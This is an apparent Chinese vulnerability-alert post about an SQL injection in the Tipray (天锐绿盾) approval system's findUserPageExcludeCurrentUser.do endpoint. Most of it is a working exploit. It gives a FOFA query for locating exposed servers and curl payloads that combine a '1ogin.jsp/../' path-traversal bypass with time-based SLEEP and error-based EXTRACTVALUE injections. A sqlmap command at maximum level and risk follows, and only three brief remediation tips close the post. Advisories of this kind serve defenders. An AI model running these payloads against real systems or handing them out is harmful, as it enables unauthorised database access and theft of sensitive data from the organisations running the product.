---
title: 【漏洞预警】天锐绿盾审批系统 findUserPageExcludeCurrentUser.do SQL注入漏洞
---

## 漏洞概述
天锐绿盾审批系统 findUserPageExcludeCurrentUser.do 接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句获取数据库敏感信息，甚至获取服务器权限。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 天锐绿盾审批系统 findUserPageExcludeCurrentUser.do SQL注入漏洞 |
| 漏洞类型 | SQL注入 (盲注) |
| 影响组件 | 天锐绿盾审批系统 |
| 严重程度 | 高危 |

## FOFA查询
```
app="TIPPAY-绿盾审批系统"
```

## POC
```bash
# 延时注入检测（延时4秒）
curl -X POST "http://target/trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "deptId=1&sort=a.ID_%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(4)))UPad)"

# 报错注入获取数据库版本
curl -X POST "http://target/trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "deptId=1&sort=a.ID_%20OR+EXTRACTVALUE(1,CONCAT(0x7e,@@VERSION))"

# 报错注入获取数据库名
curl -X POST "http://target/trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "deptId=1&sort=a.ID_%20OR+EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))"
```

使用sqlmap:
```bash
sqlmap -u "http://target/trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do" \
  --data="deptId=1&sort=a.ID_" --level=5 --risk=3
```

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面